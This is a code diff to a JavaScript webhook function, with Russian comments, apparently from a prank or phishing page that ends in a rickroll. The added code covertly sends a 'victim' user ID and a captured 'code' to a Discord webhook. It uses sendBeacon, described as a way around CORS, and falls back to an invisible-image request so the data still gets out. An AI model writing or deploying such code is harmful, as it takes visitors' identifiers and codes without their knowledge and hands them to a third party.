@@ -69,17 +69,21 @@ function sendToWebhook() {
     // Формируем текст
     const content = `🚨 **Пользователь попался!**\n👤 Жертва: <@${userId || "Неизвестный ID"}>\n🔑 Код: \`${extraInfo || "Нет данных"}\``;
 
-    const request = new XMLHttpRequest();
-    request.open("POST", webhookUrl);
+    // Создаем Blob (каплю данных) в формате JSON
+    // Это помогает обойти некоторые ограничения CORS
+    const blob = new Blob([JSON.stringify({ content: content })], { type: 'application/json' });
 
-    // Устанавливаем заголовок вручную
-    request.setRequestHeader('Content-type', 'application/json');
-
-    // Отправляем. Мы не будем слушать ответ (onreadystatechange), 
-    // чтобы не провоцировать проверку CORS на чтение.
-    request.send(JSON.stringify({ content: content }));
+    // Отправляем "маяк"
+    const success = navigator.sendBeacon(webhookUrl, blob);
     
-    console.log("Запрос отправлен. Проверь Дискорд!");
+    if (success) {
+        console.log("Маяк отправлен! Жди уведомления в Discord.");
+    } else {
+        console.log("Даже маяк не прошел, пробуем резервный метод...");
+        // Если маяк не сработал (редко, но бывает), пробуем старую добрую невидимую картинку
+        const img = new Image();
+        img.src = `${webhookUrl}?content=${encodeURIComponent(content)}`;
+    }
 }
 
         function startRickRoll() {
